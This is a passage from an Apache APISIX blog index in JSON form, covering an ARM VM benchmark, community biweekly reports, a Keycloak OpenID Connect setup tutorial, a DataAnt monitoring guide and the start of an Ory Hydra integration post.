comparison.png](https://static.apiseven.com/2022/blog/0722/3.png)\\n\\n- Latency comparison:\\n\\n![network error/Latency comparison.png](https://static.apiseven.com/2022/blog/0722/4.png)\\n\\n<table>\\n    <tr>\\n        <td><b>  </b></td>\\n        <td colspan=\\"2\\">Single Upstream</td>\\n        <td colspan=\\"2\\">Single Upstream+Two Plugins</td>\\n    </tr>\\n    <tr>\\n        <td><b>  </b></td>\\n        <td><b>Google Cloud T2D</b></td>\\n        <td><b>Google Cloud T2A</b></td>\\n        <td><b>Google Cloud T2D</b></td>\\n        <td><b>Google Cloud T2A</b></td>\\n    </tr>\\n    <tr>\\n        <td><b>QPS(request/s)</b></td>\\n        <td><b>12500</b></td>\\n        <td><b>11300</b></td>\\n        <td><b>10600</b></td>\\n        <td><b>9900</b></td>\\n    </tr>\\n    <tr>\\n        <td><b>Latency(ms)</b></td>\\n        <td><b>1.26</b></td>\\n        <td><b>1.39</b></td>\\n        <td><b>1.45</b></td>\\n        <td><b>1.60</b></td>\\n    </tr>\\n    </table>\\n\\nIt can also be seen from the above data that in network IO-intensive computing scenarios such as API Gateway, T2A still has a performance gap compared with T2D virtual machines of the same series. However, another good news is that the price of T2A is only 10% cheaper than that of T2D under the same configuration. When selecting the actual machine, users can make flexible decisions according to their business volume.\\n\\n## Summarize\\n\\nThis article mainly uses Apache APISIX to compare the performance of Google Cloud T2A and Google Cloud T2D. It can be seen that in network IO-intensive computing scenarios such as API gateways, Google Cloud T2A is not so brilliant compared to T2D, but as the first attempt of Google Cloud VMs on the ARM architecture, I believe it will continue to evolve better."},{"id":"Biweekly Report (Jul 1 - Jul 15)","metadata":{"permalink":"/blog/2022/07/21/weekly-report-0715","source":"@site/blog/2022/07/21/weekly-report-0715.md","title":"Biweekly Report (Jul 1 - Jul 15)","description":"The cloud native API gateway Apache APISIX has added functions such as supporting custom plugin priorities and checking plugin_metadata in configuration files in the past two weeks.","date":"2022-07-21T00:00:00.000Z","formattedDate":"July 21, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.625,"truncated":true,"authors":[],"prevItem":{"title":"How is Google Cloud Tau T2A performing? ","permalink":"/blog/2022/07/22/how-is-google-cloud-tau-t2a-performing"},"nextItem":{"title":"Biweekly Report (Jun 16 - Jun 30)","permalink":"/blog/2022/07/07/weekly-report-0630"}},"content":"> From Jul 1st to Jul 15th, 28 contributors submitted 99 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/2022/weeklyreport/0721/4.jpg)\\n\\n![New Contributors](https://static.apiseven.com/2022/weeklyreport/0721/5yingwen.png)\\n\\n## Good first issue\\n\\n### Issue #1146\\n\\n**Link**: https://github.com/apache/apisix-ingress-controller/issues/1146\\n\\n**Description**: We should add a new `make dev-env entry` in Makefile, to start a dev environment.\\n\\nIt should do something:\\n\\n- Use kind create a new cluster\\n- Deploy APISIX + etcd\\n- Build `apisix-ingress-controller`\u2019s image\\n- Deploy `apisix-ingress-controller`\\n\\nMost of them are already contained in the current Makefile, we need to organize them.\\n\\n### Issue #1129\\n\\n**Link**: https://github.com/apache/apisix-ingress-controller/issues/1129\\n\\n**Description**: In the current project\'s `e2e`, a lot of `time.sleep` is used. This will undoubtedly increase the overall time-consuming of CI.\\n\\nhttps://pkg.go.dev/k8s.io/apimachinery/pkg/util/wait package provides tools for polling or listening for changes to a condition.\\n\\nWe can replace the current `time.sleep` with `wait` for a more elegant way of determining whether our desired state has been reached.\\n\\n## Highlights of Recent Features\\n\\n- [Add annotations to combine ApisixPluginConfig with k8s ingress resource](https://github.com/apache/apisix-ingress-controller/pull/1139)\uff08Contributor: [dickens7](https://github.com/dickens7)\uff09\\n\\n- [Fix ID conflict when route replication in APISIX Dashboard](https://github.com/apache/apisix-dashboard/pull/2501)\uff08Contributor: [SkyeYoung](https://github.com/SkyeYoung)\uff09\\n\\n- [Add PKCE support to the openid-connect plugin](https://github.com/apache/apisix/pull/7370)\uff08Contributor: [qihaiyan](https://github.com/qihaiyan)\uff09\\n\\n- [Filter fields supported by all objects](https://github.com/apache/apisix/pull/7391)\uff08Contributor: [tzssangglass](https://github.com/tzssangglass)\uff09"},{"id":"Biweekly Report (Jun 16 - Jun 30)","metadata":{"permalink":"/blog/2022/07/07/weekly-report-0630","source":"@site/blog/2022/07/07/weekly-report-0630.md","title":"Biweekly Report (Jun 16 - Jun 30)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.","date":"2022-07-07T00:00:00.000Z","formattedDate":"July 7, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.01,"truncated":true,"authors":[],"prevItem":{"title":"Biweekly Report (Jul 1 - Jul 15)","permalink":"/blog/2022/07/21/weekly-report-0715"},"nextItem":{"title":"Use Keycloak with API Gateway to secure APIs","permalink":"/blog/2022/07/06/use-keycloak-with-api-gateway-to-secure-apis"}},"content":"> From Jun 16th to Jun 30th, 29 contributors submitted 98 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/2022/blog/0707/4.jpg)\\n\\n![New Contributors](https://static.apiseven.com/2022/blog/0707/2.png)\\n\\n## Good first issue\\n\\n### Issue #1075\\n\\n**Link**: https://github.com/apache/apisix-ingress-controller/issues/1075\\n\\n**Description**: Currently, we will use the latest version of APISIX for e2e testing to ensure the compatibility of APISIX Ingress and APISIX.\\n\\nBut we don\'t know about some of the latest changes in APISIX. I suggest we add a scheduled job to use `apisix:dev` image for regression testing.\\n\\nWe used to use `apisix:dev` for e2e testing by default, but this way would affect our development experience, and sometimes we found that e2e failed, but it was actually just due to some changes in APISIX.\\n\\n## Highlights of Recent Features\\n\\n- [Export some importent params for kafka-client](https://github.com/apache/apisix/pull/7266)\uff08Contributor: [mikawudi](https://github.com/mikawudi)\uff09\\n\\n- [Allow users to specify plugin execution priority](https://github.com/apache/apisix/pull/7273)\uff08Contributor: [tzssangglass](https://github.com/tzssangglass)\uff09\\n\\n- [Support for checking the plugin_metadata in the configuration file](https://github.com/apache/apisix/pull/7315)\uff08Contributor: [fesily](https://github.com/fesily)\uff09\\n\\n## Recent Blog Recommendations\\n\\n- [Getting Started with APISIX Test Cases](https://apisix.apache.org/blog/2022/06/27/getting-start-with-apisix-test-cases)\\n\\nThis article mainly introduces how to write test cases for Apache APISIX API Gateway.\\n\\n- [APISIX integrates with Ory Hydra](https://apisix.apache.org/blog/2022/07/04/apisix-integrates-with-hydra)\\n\\nThis article describes how Apache APISIX integrates with Ory Hydra to implement centralized authentication.\\n\\n- [Use Keycloak with API Gateway to secure APIs](https://apisix.apache.org/blog/2022/07/06/use-keycloak-with-api-gateway-to-secure-apis)\\n\\nThis article describes how Apache APISIX integrates with Keycloak (OpenID Connect Provider) to secure your APIs.\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience."},{"id":"Use Keycloak with API Gateway to secure APIs","metadata":{"permalink":"/blog/2022/07/06/use-keycloak-with-api-gateway-to-secure-apis","source":"@site/blog/2022/07/06/use-keycloak-with-api-gateway-to-secure-apis.md","title":"Use Keycloak with API Gateway to secure APIs","description":"This article describes how to secure your API with API Gateway Apache APISIX and Keycloak, and introduces OpenID Connect related concepts and interaction flow.","date":"2022-07-06T00:00:00.000Z","formattedDate":"July 6, 2022","tags":[{"label":"Authentication","permalink":"/blog/tags/authentication"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":7.32,"truncated":true,"authors":[{"name":"Xinxin Zhu","title":"Apache APISIX Committer","url":"https://github.com/starsz","image_url":"https://github.com/starsz.png","imageURL":"https://github.com/starsz.png"},{"name":"Zhiyuan Ju","title":"Apache Member","url":"https://github.com/juzhiyuan","image_url":"https://github.com/juzhiyuan.png","imageURL":"https://github.com/juzhiyuan.png"}],"prevItem":{"title":"Biweekly Report (Jun 16 - Jun 30)","permalink":"/blog/2022/07/07/weekly-report-0630"},"nextItem":{"title":"How to monitor Apache APISIX with DataAnt","permalink":"/blog/2022/07/05/use-dataant-to-monitor-apisix"}},"content":"> This article describes how Apache APISIX integrates with Keycloak (OpenID Connect Provider) to secure your APIs.\\n\\n\x3c!--truncate--\x3e\\n\\nOpenID Connect referred to as OIDC, is an authentication protocol based on the OAuth 2.0. It allows the client to obtain user information from the identity provider (IdP), e.g., Keycloak, Ory, Okta, Auth0, etc. The open-source API Gateway Apache APISIX supports using the [openid-connect plugin](https://apisix.apache.org/docs/apisix/plugins/openid-connect) to integrate with the above identity Providers. It will redirect all unauthenticated clients to IdP\'s login page. After the successful authentication, APISIX will pass the user information to the upstream service.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/1.png)\\n\\nKeycloak is an open-source identity and access management. It adds authentication to applications and secures services with minimum effort. Also, it provides user federation, strong authentication, user management, fine-grained authorization, and more. In this post, we will take [Keycloak](https://www.keycloak.org/docs/latest/securing_apps/) as an example, and let\'s see how to integrate it with APISIX to protect your services.\\n\\n## Workflow\\n\\nThe following diagram shows the OpenID-Connect protocol interaction flow.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/2.png)\\n\\nIn the Redirect stage, Identity Provider redirects users to a pre-configured Redirect URL, similar to `http://127.0.0.1:9080/callback`. But note: it is a non-existent API that only captures the relevant request and processes the code for Token exchange using OIDC logic. Please do not use this address as a condition to trigger OIDC plugin redirection; otherwise, it will return the error request to the redirect_uri path, but there\'s no session state found.\\n\\n## Terminology\\n\\n1. Bearer Only: Keycloak supports username/password or AccessTokens for authentication, and if the bearer_only option is enabled, only AccessTokens are allowed for authentication, which is applicable for access authentication between services.\\n2. Realm: A realm in Keycloak is the equivalent of a tenant; realms are isolated from one another and can only manage and authenticate their users.\\n3. Scope: Client scope is a way to limit the roles that get declared inside an access token. For example, when a client requests that a user be authenticated, the access token they receive back will only contain the role mappings you\u2019ve explicitly specified for the client\u2019s scope. Client scope allows you to limit each individual access token\'s permissions rather than giving the client access to all of the user\u2019s permissions.\\n4. User: Users are entities that can log in to Keycloak. Please think about \\"Sign in with Google.\\"\\n5. Client: Clients are services (entities) that want to use Keycloak to protect themselves.\\n\\n## Prerequisites\\n\\n> 1. This guide will use CentOS 7 and Docker v20.10.17 to install and start Keycloak.\\n> 2. If you deploy Keycloak and APISIX on your server, please change the following IP (127.0.0.1) to your server\'s IP.\\n\\n### Apache APISIX\\n\\nPlease refer to https://apisix.apache.org/docs/apisix/getting-started to install and start APISIX. After that, you could visit `http://127.0.0.1:9080/` to access the APISIX instance.\\n\\n### Keycloak\\n\\nExecute the following command to run Keycloak on the server, and we pass admin as Keycloak administrator\'s username and password.\\n\\n```shell\\ndocker run -d -p 8080:8080 -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak:18.0.2 start-dev\\n\\n61a6d6cbfb1f9fe81a6a0dfde7e8ba15e58bf99303697c4e73ab249d005a6678\\n```\\n\\nCheck if the Keycloak container starts successfully.\\n\\n```shell\\ndocker ps -a\\n\\nCONTAINER ID   IMAGE                              COMMAND                  CREATED          STATUS          PORTS                                                 NAMES\\n61a6d6cbfb1f   quay.io/keycloak/keycloak:18.0.2   \\"/opt/keycloak/bin/k\u2026\\"   11 seconds ago   Up 10 seconds   0.0.0.0:8080->8080/tcp, :::8080->8080/tcp, 8443/tcp   heuristic_dirac\\n```\\n\\nOnce started, Keycloak will be available on port `8080`.\\n\\n#### Create a Realm\\n\\nVisit `http://127.0.0.1:8080/` in your browser to display the following screen, indicating that Keycloak has started successfully.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/3.png)\\n\\nGo to the Administrator Console and log in using admin as the username and password.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/4.png)\\n\\nWhen you log in for the first time after installation, a Realm named master will be created in the system by default, but it\'s dedicated to managing Keycloak, and we should not use it for our applications, so we need to create a new one.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/5.png)\\n\\nClick Add realm when you mouse over the Master on the left and enter myrealm as the Realm\'s name to create it.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/6.png)\\n\\nAfter successful creation, you will see that you have switched to myrealm and at the bottom, you have Endpoints -> OpenID Endpoint Configuration at `http://127.0.0.1:8080/realms/myrealm/.well-known/openid-configuration`.\\n\\nThis endpoint contains a Discovery file, which will be used later as the address of each node that OIDC needs to use.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/7.png)\\n\\n#### Create a User\\n\\nA user belongs to one realm, we need to create a user for login authentication. Select `Manage -> Users -> Add user` and enter myuser as the username, save it, then visit the Users page and select `View all users`.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/8.png)\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/9.png)\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/10.png)\\n\\nClick on the ID, go to the Credentials tab, and set a new password (this example uses mypassword as the password). Also, set Temporary to OFF to turn off the restriction that you must change your password the first time you log in.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/11.png)\\n\\nClick Set Password to save changes.\\n\\n#### Create a Client\\n\\nVisit `Configure -> Clients -> Create` to create a new client and obtain a Client ID and Client Secret, we will use that information in APISIX later.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/12.png)\\n\\nEnter the Client ID and save it. This example uses myclient as the ID.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/13.png)\\n\\nAfter saving, 2 parameters need to be configured.\\n\\n1. Access Type: default is public, please change it to credential to obtain Client Secret.\\n2. Valid Redirect URIs: When the login is successful, Keycloak will carry the state and code to redirect the client to this address, so set it to a specific callback address for Apache APISIX, for example: `http://127.0.0.1:9080/anything/callback`\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/14.png)\\n\\nWhen the settings are complete and saved, the Credentials tab will appear at the top of the page, and please copy the Secret value (Client Secret).\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/15.png)\\n\\n### Summary\\n\\n#### Apache APISIX\\n\\nService URL: `http://127.0.0.1:9080/`\\n\\n#### Keycloak\\n\\n1. Service URL: `http://127.0.0.1:8080/`\\n2. Realm: `myrealm`\\n3. Client ID: `myclient`\\n4. Client Secret: `e91CKZQwhxyDqpkP0YFUJBxiXJ0ikJhq`\\n5. Redirect URI: `http://127.0.0.1:9080/anything/callback`\\n6. Discovery: `http://127.0.0.1:8080/realms/myrealm/.well-known/openid-configuration`\\n7. Logout URL: `/anything/logout`\\n8. Bearer Only: `false`\\n9. Username: `myuser`\\n10. Password: `mypassword`\\n\\n## Scenarios\\n\\n### Note\\n\\nThis guide will use a public service httpbin.org/anything as the upstream service, it will return anything passed in request data.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/16.png)\\n\\n### Case 1: Use username/password to protect service\\n\\nThis example will direct the client to the login page to authenticate using a username and password.\\n\\n1. Create an API:\\n\\n```shell\\ncurl -XPUT 127.0.0.1:9080/apisix/admin/routes/1 -H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -d \'{\\n    \\"uri\\":\\"/anything/*\\",\\n    \\"plugins\\": {\\n        \\"openid-connect\\": {\\n            \\"client_id\\": \\"myclient\\",\\n            \\"client_secret\\": \\"e91CKZQwhxyDqpkP0YFUJBxiXJ0ikJhq\\",\\n            \\"discovery\\": \\"http://127.0.0.1:8080/realms/myrealm/.well-known/openid-configuration\\",\\n            \\"scope\\": \\"openid profile\\",\\n            \\"bearer_only\\": false,\\n            \\"realm\\": \\"myrealm\\",\\n            \\"redirect_uri\\": \\"http://127.0.0.1:9080/anything/callback\\",\\n            \\"logout_path\\": \\"/anything/logout\\"\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"httpbin.org:80\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/17.png)\\n\\n2. When you visit `http://127.0.0.1:9080/anything/test` after successful API creation, APISIX will redirect your browser to Keycloak\'s login page because you need to log in.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/18.png)\\n\\n3. Enter username (myuser) and password (mypassword) to log in, and your browser will redirect to `http://127.0.0.1:9080/anything/test`.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/19.png)\\n\\n4. Visit `http://127.0.0.1:9080/anything/logout` to log out:\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/20.png)\\n\\n### Case 2: Use AccessToken to authenticate\\n\\nBy enabling the bearer_only parameter to authenticate calls between services, the service must carry the Authorization Header when accessing APISIX. Otherwise, APISIX will reject the request.\\n\\n1. Create an API:\\n\\n```shell\\ncurl -XPUT 127.0.0.1:9080/apisix/admin/routes/1 -H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -d \'{\\n    \\"uri\\":\\"/anything/*\\",\\n    \\"plugins\\": {\\n        \\"openid-connect\\": {\\n            \\"client_id\\": \\"myclient\\",\\n            \\"client_secret\\": \\"e91CKZQwhxyDqpkP0YFUJBxiXJ0ikJhq\\",\\n            \\"discovery\\": \\"http://127.0.0.1:8080/realms/myrealm/.well-known/openid-configuration\\",\\n            \\"scope\\": \\"openid profile\\",\\n            \\"bearer_only\\": true,\\n            \\"realm\\": \\"myrealm\\",\\n            \\"redirect_uri\\": \\"http://127.0.0.1:9080/anything/callback\\",\\n            \\"logout_path\\": \\"/anything/logout\\"\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"httpbin.org:80\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/21.png)\\n\\n2. Accessing Apache APISIX without an `X-Access-Token` will return 401 indicating unauthorized.\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/22.png)\\n\\n3. Call the Keycloak API to obtain the AccessToken.\\n\\n```shell\\ncurl -XPOST \\"http://127.0.0.1:8080/realms/myrealm/protocol/openid-connect/token\\" -d \\"grant_type=password&username=myuser&client_id=myclient&client_secret=e91CKZQwhxyDqpkP0YFUJBxiXJ0ikJhq&password=mypassword\\"\\n```\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/23.png)\\n\\n4. Place the `AccessToken` in the Authorization header (replace `${AccessToken}`) to request APISIX, and you can authenticate successfully.\\n\\n```shell\\ncurl http://127.0.0.1:9080/anything/test -H \\"Authorization: Bearer ${AccessToken}\\"\\n```\\n\\n![screenshot](https://static.apiseven.com/2022/blog/0706/24.png)\\n\\n### Case 3: Parse UserInfo on upstream service\\n\\nWhen APISIX\'s `set_userinfo_header` is enabled, the callback request after successful authentication will carry the `X-Userinfo` request header, which contains basic information about the User and can be used to obtain the user content via base64_decode.\\n\\n## FAQ\\n\\n1. **Why is the cookie value very big in APISIX?**\\n\\nBecause APISIX writes `id_token`, `access_token`, and `refresh_token` into the cookie, the entire cookie content is quite big. For detailed implementation, read the logic for [setting up a session](https://github.com/zmartzone/lua-resty-openidc/blob/b07330120ffe54dd3fbeac247726b76d0f9dc793/lib/resty/openidc.lua#L1179-L1188) in the `lua-resty-openidc` library.\\n\\n2. **How to change the name and location of the cookie stored in the Session?**\\n\\nCurrently, the openid-connect plugin does not provide the ability to customize this part of the configuration, so we can use the method provided in `lua-resty-session`: override its default configuration by NGINX variables.\\nWe rely on the NGINX configuration injection capabilities provided by APISIX to achieve the override: the name of the Session storage cookie can be modified by adding this code to the configuration file {apisix}/conf/config.yaml.\\n\\n```yaml\\nnginx_config:\\n  http_server_configuration_snippet: |\\n    set $session_name \\"session_override\\";\\n```\\n\\nFor more information please visit:\\n\\n1. [lua-resty-session Init phase](https://github.com/bungle/lua-resty-session/blob/master/lib/resty/session.lua#L348-L380)\\n2. [lua-resty-session Pluggable Storage Adapters](https://github.com/bungle/lua-resty-session#pluggable-storage-adapters)\\n\\n## Reference\\n\\n1. [Integrate Keycloak with APISIX](https://apisix.apache.org/zh/blog/2021/12/10/integrate-keycloak-auth-in-apisix/)\\n2. [Keycloak Getting Started](https://www.keycloak.org/getting-started/getting-started-docker)\\n3. [Keycloak Realm vs Client](https://stackoverflow.com/questions/56561554/keycloak-realm-vs-keycloak-client)\\n4. [Keycloak Client vs User](https://stackoverflow.com/questions/49107701/keycloak-client-vs-user)\\n5. [What is Client Scope?](https://wjw465150.gitbooks.io/keycloak-documentation/content/server_admin/topics/roles/client-scope.html)"},{"id":"How to monitor Apache APISIX with DataAnt","metadata":{"permalink":"/blog/2022/07/05/use-dataant-to-monitor-apisix","source":"@site/blog/2022/07/05/use-dataant-to-monitor-apisix.md","title":"How to monitor Apache APISIX with DataAnt","description":"This article mainly introduces how to upload the API Gateway Apache APISIX indicator data to the DataAnt monitoring system through the DataAnt Agent.","date":"2022-07-05T00:00:00.000Z","formattedDate":"July 5, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.345,"truncated":true,"authors":[{"name":"Fei Han","title":"Author","url":"https://github.com/hf400159","image_url":"https://github.com/hf400159.png","imageURL":"https://github.com/hf400159.png"}],"prevItem":{"title":"Use Keycloak with API Gateway to secure APIs","permalink":"/blog/2022/07/06/use-keycloak-with-api-gateway-to-secure-apis"},"nextItem":{"title":"APISIX integrates with Ory Hydra","permalink":"/blog/2022/07/04/apisix-integrates-with-hydra"}},"content":"> This article mainly introduces how to upload the APISIX indicator data to the DATA ANT monitoring system through the DataAnt Agent.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\n[Apache APISIX](https://github.com/apache/apisix) is an open source cloud native API gateway. As an API gateway, it has the characteristics of dynamic, real-time, and high performance. It provides rich traffic management functions such as load balancing, dynamic upstream, grayscale publishing, service fusing, identity authentication and observability. You can use APISIX to handle the traditional north-south traffic and the east-west traffic between services. It can also be used as a K8s ingress controller. Thanks to the full dynamic design of APISIX, configuration changes can be made at any time without restarting the service.\\n\\nThe DataAnt full-stack cloud monitoring system can aggregate all the operation and maintenance data of IaaS, PaaS and SaaS layers through big data and machine learning, and provide users with a unified visual interface. DataAnt allows users to move seamlessly and quickly between relevant monitoring data sources without having to switch tools and gain more granular visibility into the state of their IT systems. The DataAnt Agent it provides can monitor APISIX in real time and upload its monitoring data to the DataAnt PaSS platform to realize one-stop cloud monitoring.\\n\\n## Introduction\\n\\n![principle](https://static.apiseven.com/2022/blog/0705/1.svg)\\n\\n1. Collection configuration\\n\\n  The DataAnt Agent will first initialize and register the collector through the APISIX item in `config.yaml`. The same Agent can register multiple collectors. After the collector collects the indicators exposed by APISIX, it encrypts the indicator data and uploads it to DataAnt Cloud.\\n\\n2. Data visualization\\n\\n  After DataAnt Cloud receives the data, the data will be stored in the time series database after preliminary monitoring information supplementation and processing, and then APISIX can be monitored in real time through DataAnt\'s Dashboard.\\n\\n3. Alarm notification\\n\\n  The data will also be distributed to the alarm matching processing through the message, and then the notification aggregation will be carried out. Finally, the alarm will be sent through the configured notification method, that is, the abnormal situation of APISIX can be received in real time.\\n\\n## Operation steps\\n\\n1. First, you need to access [DataAnt Cloud](http://139.224.11.158), register an account and log in to the platform.\\n\\n2. Obtain the Agent of DataAnt through the [download link](https://pan.baidu.com/s/1fabvSiDLDh8ZRTjpzINHLg?pwd=87d4). After the download is complete, upload it to the machine where APISIX is located and add execution permission to the Agent.\\n\\n3. Create the configuration file `./config.yaml` required by DataAnt Agent in the current directory. The detailed configuration is as follows:\\n\\n  ```yaml\\n  tenantId: 11\\n  hostIp: 127.0.0.1\\n  hostName: apisix\\n  configs:\\n    - uri: http://127.0.0.1:9091\\n      type: apisix\\n      asName: apisix_test\\n  ```\\n\\n4. Start the Agent using the following command.\u3002\\n\\n  ```shell\\n  ./agent\\n  ```\\n\\n  After successful startup, the following data will be returned:\\n\\n   ```shell\\n  2022/06/21 20:50:10 {\\"code\\":200,\\"msg\\":\\"\u8bf7\u6c42\u6210\u529f\\",\\"data\\":null}\\n  2022/06/21 20:50:30 {\\"code\\":200,\\"msg\\":\\"\u8bf7\u6c42\u6210\u529f\\",\\"data\\":null}\\n  2022-06-21 20:51:00:000        INFO        apisix/apisix.go:25        \u83b7\u53d6\u5bf9\u5e94\u76d1\u63a7\u6570\u636e\uff0c\u6570\u636e\u957f\u5ea61675\\n  2022-06-21 20:51:00:000        INFO        prometheus/prometheusCollector.go:43        \u83b7\u53d6\u5bf9\u5e94\u76d1\u63a7\u6570\u636e\u5f00\u59cb\u89e3\u67901675\\n  2022-06-21 20:51:00:000        INFO        prometheus/prometheusCollector.go:43        \u83b7\u53d6\u5bf9\u5e94\u76d1\u63a7\u6570\u636e\u5b8c\u6210\u89e3\u6790 \u89e3\u6790\u6307\u6807\u6570\u91cf21\\n  2022-06-21 20:51:00:000        INFO        collector/collector.go:82        apisix\u91c7\u96c6\u5230\u6570\u636e\u6570\u91cf21\\n  2022-06-21 20:51:00:000        INFO        runtime/asm_amd64.s:1581        apisix_test9091:\u6307\u6807\u6570:21\\n  ```\\n\\n5. On the home page of the DataAnt platform, click `Install Integration Plugin` > `Monitoring Plugin`, select APISIX and click `Click to configure` under `Configuration`.\\n\\n6. On the homepage of the DataAnt platform, click `Dashboard` in the left navigation bar and create a new dashboard. Select the indicators you need and drag them to the dashboard. The configured indicators are as follows:\\n\\n  ![dashboard](https://static.apiseven.com/2022/blog/0705/2.PNG)\\n\\n  :::note\\n\\n  DataAnt Agent will report data every 30 seconds, so there will be a certain delay.\\n\\n  :::\\n\\n## Summary\\n\\nThis article mainly introduces how to upload APISIX index data to the DataAnt monitoring system through DataAnt Agent. You can use it later to configure relevant alarm rules and alarm contacts. When the service fails, you can be notified in time."},{"id":"APISIX integrates with Ory Hydra","metadata":{"permalink":"/blog/2022/07/04/apisix-integrates-with-hydra","source":"@site/blog/2022/07/04/apisix-integrates-with-hydra.md","title":"APISIX integrates with Ory Hydra","description":"This article describes the API gateway Apache APISIX for centralized authentication via the OpenID Connect plugin Hydra integration.","date":"2022-07-04T00:00:00.000Z","formattedDate":"July 4, 2022","tags":[{"label":"Authentication","permalink":"/blog/tags/authentication"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":8.25,"truncated":true,"authors":[{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://github.com/hf400159.png","imageURL":"https://github.com/hf400159.png"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"How to monitor Apache APISIX with DataAnt","permalink":"/blog/2022/07/05/use-dataant-to-monitor-apisix"},"nextItem":{"title":"Getting Started with APISIX Test Cases","permalink":"/blog/2022/06/27/getting-start-with-apisix-test-cases"}},"content":"> This article describes how Apache APISIX integrates with Ory Hydra to implement centralized authentication.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background Information\\n\\n### Apache APISIX\\n\\n[Apache APISIX](https://github.com/apache/apisix) is an open source cloud native API gateway. As an API gateway, it has the characteristics of dynamic, real-time, and high performance. It provides rich traffic management functions such as load balancing, dynamic upstream, gray-scale publishing, service fusing, identity authentication and observability. You can use APISIX to handle the traditional north-south traffic and the east-west traffic between services. It can also be used as a K8s ingress controller. Thanks to the full dynamic design of APISIX, configuration changes can be made at any time without restarting the service.\\n\\nThe `openid-connect` plugin of APISIX supports the OpenID Connect protocol. Users can use this plugin to allow Apache APISIX to connect with many authentication service providers and deploy it in enterprises as a centralized authentication gateway.\\n\\n### ORY Hydra\\n\\n[Ory Hydra](https://github.com/ory/hydra) is one of the identity providers that supports the OAuth 2.0 and OpenID Connect protocols, based on the OAuth 2.0 authorization framework and the Open ID Connect Core 1.0 framework, with both open source and cloud native features. It can be integrated with any login system, and through OAuth 2.0 Access, Refresh, and ID Tokens, third parties can easily access your API, enabling users to interact with any application anytime, anywhere.\\n\\nOry Hydra is written in Go language and provides SDKs for almost all languages, including Dart, .NET, Go, Java, PHP, Python, Ruby, Rust, and Typescript. It works with any login system, and the login experience can be easily customized.\\n\\n## Introduction\\n\\nOpenID is a centralized authentication mode, and it is a decentralized identity authentication system. The advantage of using OpenID is that users only need to register and log in on one OpenID identity provider\'s website and use one account and password information to access different applications.\\n\\nWith the `openid-connect` plugin supported by APISIX, we can integrate with authenticators supporting the OpenID Connect protocol. For example: Ory Hydra. For more information, please refer to: [Centralized Identity 